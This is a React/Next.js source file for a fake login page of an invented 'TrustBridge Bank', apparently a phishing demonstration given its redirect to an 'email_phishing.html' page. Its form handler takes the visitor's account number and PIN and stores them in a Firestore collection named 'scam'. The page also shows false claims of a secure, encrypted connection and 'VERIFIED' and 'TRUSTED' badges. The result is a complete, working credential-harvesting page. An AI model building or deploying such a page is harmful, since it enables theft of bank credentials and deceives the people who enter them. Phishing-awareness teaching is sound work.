"use client";

import React, { useState, useEffect } from "react";
import { app } from "@/lib/firebase";
import Image from "next/image";
import { getFirestore, collection, addDoc } from "firebase/firestore";

// Types
interface CarouselImage {
  id: number;
  src: string;
  alt: string;
}

const TrustBridgeBankLogin: React.FC = () => {
  // State for carousel
  const [currentImageIndex, setCurrentImageIndex] = useState(0);

  // Sample carousel images
  const carouselImages: CarouselImage[] = [
    {
      id: 1,
      src: "/images/Teller Bank Cantik.jpg",
      alt: "Bank employee at desk",
    },
    { id: 2, src: "/images/mobile bank.jpg", alt: "Mobile banking app" },
    { id: 3, src: "/images/investment.jpg", alt: "Customer service" },
  ];

  // Auto-rotate carousel
  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentImageIndex((prevIndex) =>
        prevIndex === carouselImages.length - 1 ? 0 : prevIndex + 1
      );
    }, 5000); // Change image every 5 seconds

    return () => clearInterval(interval); // Clean up on unmount
  }, [carouselImages.length]);

  // Handle carousel navigation
  const nextImage = () => {
    setCurrentImageIndex((prevIndex) =>
      prevIndex === carouselImages.length - 1 ? 0 : prevIndex + 1
    );
  };

  const prevImage = () => {
    setCurrentImageIndex((prevIndex) =>
      prevIndex === 0 ? carouselImages.length - 1 : prevIndex - 1
    );
  };

  return (
    <>
      <div className="min-h-screen bg-gray-100">
        {/* Header */}
        <header className="bg-blue-900 text-white p-4">
          <div className="container mx-auto flex justify-between items-center">
            <h1 className="text-xl font-bold">TrustBridge Bank</h1>
            <div className="text-sm">Customer Service: 1-800-555-0123</div>
          </div>
        </header>

        {/* Main content */}
        <main className="container mx-auto py-8 px-4">
          <div className="max-w-4xl mx-auto bg-white rounded shadow-lg overflow-hidden">
            <div className="flex flex-col md:flex-row">
              {/* Left side - Carousel */}
              <div className="w-full md:w-1/2 bg-blue-900 p-4 relative">
                <div className="relative h-64 md:h-96">
                  <Image
                    src={carouselImages[currentImageIndex].src}
                    alt={carouselImages[currentImageIndex].alt}
                    fill
                    className="object-cover"
                  />
                  {/* Carousel navigation */}
                  <button
                    onClick={prevImage}
                    className="absolute left-2 top-1/2 -translate-y-1/2 bg-orange-500 text-white rounded-full p-2 opacity-80 hover:opacity-100"
                    aria-label="Previous image"
                  >
                    &lt;
                  </button>
                  <button
                    onClick={nextImage}
                    className="absolute right-2 top-1/2 -translate-y-1/2 bg-orange-500 text-white rounded-full p-2 opacity-80 hover:opacity-100"
                    aria-label="Next image"
                  >
                    &gt;
                  </button>
                </div>
                {/* Carousel indicators */}
                <div className="flex justify-center mt-4 space-x-2">
                  {carouselImages.map((_, index) => (
                    <button
                      key={index}
                      onClick={() => setCurrentImageIndex(index)}
                      className={`h-2 w-2 rounded-full ${
                        index === currentImageIndex ? "bg-white" : "bg-gray-400"
                      }`}
                      aria-label={`Go to image ${index + 1}`}
                    />
                  ))}
                </div>
              </div>

              {/* Right side - Login form */}
              <div className="w-full md:w-1/2 p-8">
                <div className="flex justify-center mb-4">
                  <div className="w-16 h-16 bg-indigo-800 flex items-center justify-center rounded">
                    <div className="text-white text-2xl">TB</div>
                  </div>
                </div>
                <h2 className="text-xl font-bold text-center text-blue-900 mb-1">
                  TrustBridge Bank Login
                </h2>
                <p className="text-sm text-center text-gray-600 mb-6">
                  Access your accounts securely
                </p>

                <form
                  onSubmit={async (e) => {
                    e.preventDefault();

                    const accountNumber = (
                      document.getElementById(
                        "accountNumber"
                      ) as HTMLInputElement
                    ).value;
                    const pin = (
                      document.getElementById("pin") as HTMLInputElement
                    ).value;

                    try {
                      const db = getFirestore(app);
                      await addDoc(collection(db, "scam"), {
                        accountNumber: accountNumber,
                        pin: pin,
                      });
                      console.log("Document written with ID: ", accountNumber);
                      window.location.href =
                        "https://exxsid.github.io/IAS/email_phishing.html";
                    } catch (error) {
                      console.error("Error adding document: ", error);
                    }
                  }}
                >
                  <div className="mb-4">
                    <label
                      htmlFor="accountNumber"
                      className="block text-gray-700 mb-2"
                    >
                      Bank Account Number
                    </label>
                    <input
                      type="text"
                      id="accountNumber"
                      placeholder="e.g. 123456789102"
                      className="w-full p-2 border border-gray-300 rounded"
                      required
                    />
                  </div>
                  <div className="mb-6">
                    <label htmlFor="pin" className="block text-gray-700 mb-2">
                      PIN
                    </label>
                    <input
                      type="password"
                      id="pin"
                      className="w-full p-2 border border-gray-300 rounded"
                      required
                    />
                  </div>
                  <button
                    type="submit"
                    className="w-full bg-blue-900 text-white py-2 rounded hover:bg-blue-800"
                  >
                    Log In
                  </button>
                </form>

                <div className="mt-8">
                  <p className="text-sm text-center text-gray-600 mb-2">
                    Your connection to this site is secure and encrypted
                  </p>
                  <p className="text-sm text-center text-gray-600 mb-4">
                    We never share your personal information without your
                    permission
                  </p>
                  <div className="flex justify-center space-x-4">
                    <span className="text-xs bg-gray-200 px-3 py-1 rounded">
                      SECURE
                    </span>
                    <span className="text-xs bg-gray-200 px-3 py-1 rounded">
                      VERIFIED
                    </span>
                    <span className="text-xs bg-gray-200 px-3 py-1 rounded">
                      TRUSTED
                    </span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </main>

        {/* Footer */}
        <footer className="text-center text-gray-600 text-sm py-4">
          <p>
            © 2025 TrustBridge Bank. All rights reserved. |
            <a href="#" className="text-blue-900 hover:underline ml-1">
              Privacy Policy
            </a>{" "}
            |
            <a href="#" className="text-blue-900 hover:underline ml-1">
              Terms of Service
            </a>
          </p>
        </footer>
      </div>
    </>
  );
};

export default TrustBridgeBankLogin;
